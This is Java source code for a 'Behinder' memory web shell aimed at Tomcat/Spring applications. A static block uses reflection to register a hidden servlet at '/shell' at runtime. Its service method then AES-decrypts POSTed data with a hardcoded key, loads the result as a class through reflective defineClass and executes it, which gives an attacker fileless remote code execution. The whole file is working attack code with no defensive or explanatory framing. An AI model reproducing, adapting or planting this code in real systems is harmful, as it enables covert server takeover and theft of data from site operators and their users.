import org.apache.catalina.Container;
import org.apache.catalina.Wrapper;
import org.apache.catalina.core.ApplicationContext;
import org.apache.catalina.core.StandardContext;
import org.apache.catalina.loader.WebappClassLoaderBase;
import org.springframework.web.context.request.RequestContextHolder;
import org.springframework.web.context.request.ServletRequestAttributes;

import javax.crypto.Cipher;
import javax.crypto.spec.SecretKeySpec;
import javax.servlet.*;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import javax.servlet.http.HttpSession;
import java.io.IOException;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.util.HashMap;
import java.util.Map;

public class Behinder implements Servlet {
    private final String pa = "3ad2fddfe8bad8e6";
    //e45e329feb5d925b
    //e45e329feb5d925ba3f549b17b4b3dde

    static {
        try {
            //以下代码就是动态注册一个wrapper
            ServletRequestAttributes attributes = (ServletRequestAttributes) RequestContextHolder.getRequestAttributes();
            HttpServletRequest request = attributes.getRequest();
            ServletContext servletContext = request.getServletContext();
            Field appctx = servletContext.getClass().getDeclaredField("context");
            appctx.setAccessible(true);
            ApplicationContext applicationContext= (ApplicationContext)appctx.get(servletContext);
            Field stdctx = applicationContext.getClass().getDeclaredField("context");
            stdctx.setAccessible(true);
            StandardContext standardContext = (StandardContext) stdctx.get(applicationContext);
            Behinder behinderServlet = new Behinder();
            Method createWrapper = Class.forName("org.apache.catalina.core.StandardContext").getDeclaredMethod("createWrapper");
            Wrapper greetWrapper = (Wrapper) createWrapper.invoke(standardContext);
            Method gname = Container.class.getDeclaredMethod("setName", String.class);
            gname.invoke(greetWrapper, "shell");
            Method gload = Wrapper.class.getDeclaredMethod("setLoadOnStartup", int.class);
            gload.invoke(greetWrapper, 1);
            Method gservlet = Wrapper.class.getDeclaredMethod("setServlet", Servlet.class);
            gservlet.invoke(greetWrapper, behinderServlet);
            Method gclass = Wrapper.class.getDeclaredMethod("setServletClass", String.class);
            gclass.invoke(greetWrapper, behinderServlet.getClass().getName());
            Method gchild = StandardContext.class.getDeclaredMethod("addChild", Container.class);
            gchild.invoke(standardContext, greetWrapper);
            Method gmap = StandardContext.class.getDeclaredMethod("addServletMappingDecoded", String.class, String.class, boolean.class);
            gmap.invoke(standardContext, "/shell", "shell", false);
        } catch (Exception hi) {
            hi.printStackTrace();
        }
    }

    @Override
    public void init(ServletConfig servletConfig) throws ServletException {

    }

    @Override
    public ServletConfig getServletConfig() {
        return null;
    }

    @Override
    public void service(ServletRequest servletRequest, ServletResponse servletResponse) throws ServletException, IOException {
        HttpServletRequest request = (HttpServletRequest) servletRequest;
        HttpServletResponse response = (HttpServletResponse) servletResponse;
        HttpSession session = request.getSession();
        Map<String, Object> pageContext = new HashMap<String, Object>();
        pageContext.put("session", session);
        pageContext.put("request", request);
        pageContext.put("response", response);
        ClassLoader loader = (ClassLoader) Thread.currentThread().getContextClassLoader();
        if (request.getMethod().equals("POST")) {
            if (loader.getClass().getSuperclass().getName().equals("java.lang.ClassLoader")) {
                Class Lclass = loader.getClass().getSuperclass();
                RushThere(Lclass, loader, session, request, pageContext);
            } else if (loader.getClass().getSuperclass().getSuperclass().getName().equals("java.lang.ClassLoader")) {
                Class Lclass = loader.getClass().getSuperclass().getSuperclass();
                RushThere(Lclass, loader, session, request, pageContext);
            } else {
                if (loader.getClass().getSuperclass().getSuperclass().getSuperclass().getName().equals("java.lang.ClassLoader")) {
                    Class Lclass = loader.getClass().getSuperclass().getSuperclass().getSuperclass();
                    RushThere(Lclass, loader, session, request, pageContext);
                } else if (loader.getClass().getSuperclass().getSuperclass().getSuperclass().getSuperclass().getName().equals("java.lang.ClassLoader")) {
                    Class Lclass = loader.getClass().getSuperclass().getSuperclass().getSuperclass().getSuperclass();
                    RushThere(Lclass, loader, session, request, pageContext);
                } else if (loader.getClass().getSuperclass().getSuperclass().getSuperclass().getSuperclass().getSuperclass().getName().equals("java.lang.ClassLoader")) {
                    Class Lclass = loader.getClass().getSuperclass().getSuperclass().getSuperclass().getSuperclass().getSuperclass();
                    RushThere(Lclass, loader, session, request, pageContext);
                } else {
                    Class Lclass = loader.getClass().getSuperclass().getSuperclass().getSuperclass().getSuperclass().getSuperclass().getSuperclass();
                    RushThere(Lclass, loader, session, request, pageContext);
                }
            }
        }
    }

    public void RushThere(Class Lclass, ClassLoader cl, HttpSession session, HttpServletRequest request, Map<String, Object> pageContext) {
        byte[] bytecode = java.util.Base64.getDecoder().decode("yv66vgAAADQAGgoABAAUCgAEABUHABYHABcBAAY8aW5pdD4BABooTGphdmEvbGFuZy9DbGFzc0xvYWRlcjspVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQADTFU7AQABYwEAF0xqYXZhL2xhbmcvQ2xhc3NMb2FkZXI7AQABZwEAFShbQilMamF2YS9sYW5nL0NsYXNzOwEAAWIBAAJbQgEAClNvdXJjZUZpbGUBAAZVLmphdmEMAAUABgwAGAAZAQABVQEAFWphdmEvbGFuZy9DbGFzc0xvYWRlcgEAC2RlZmluZUNsYXNzAQAXKFtCSUkpTGphdmEvbGFuZy9DbGFzczsAIQADAAQAAAAAAAIAAAAFAAYAAQAHAAAAOgACAAIAAAAGKiu3AAGxAAAAAgAIAAAABgABAAAAAgAJAAAAFgACAAAABgAKAAsAAAAAAAYADAANAAEAAQAOAA8AAQAHAAAAPQAEAAIAAAAJKisDK763AAKwAAAAAgAIAAAABgABAAAAAwAJAAAAFgACAAAACQAKAAsAAAAAAAkAEAARAAEAAQASAAAAAgAT");
        try {
            java.lang.reflect.Method define = Lclass.getDeclaredMethod("defineClass", byte[].class, int.class, int.class);
            define.setAccessible(true);
            Class uclass = null;
            try {
                uclass = cl.loadClass("U");
            } catch (ClassNotFoundException e) {
                uclass = (Class) define.invoke(cl, bytecode, 0, bytecode.length);
            }
            Constructor constructor = uclass.getDeclaredConstructor(ClassLoader.class);
            constructor.setAccessible(true);
            Object u = constructor.newInstance(this.getClass().getClassLoader());
            Method Um = uclass.getDeclaredMethod("g", byte[].class); //获取g函数
            Um.setAccessible(true);
            String k = pa;
            session.setAttribute("u", k);
            Cipher c = Cipher.getInstance("AES");
            c.init(2, new SecretKeySpec(k.getBytes(), "AES"));
            byte[] eClassBytes = c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()));
            Class eclass = (Class) Um.invoke(u, eClassBytes);
            Object a = eclass.newInstance();
            Method b = eclass.getDeclaredMethod("equals", Object.class);
            b.setAccessible(true);
            b.invoke(a, pageContext);
            return;
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    @Override
    public String getServletInfo() {
        return null;
    }

    @Override
    public void destroy() {

    }
}
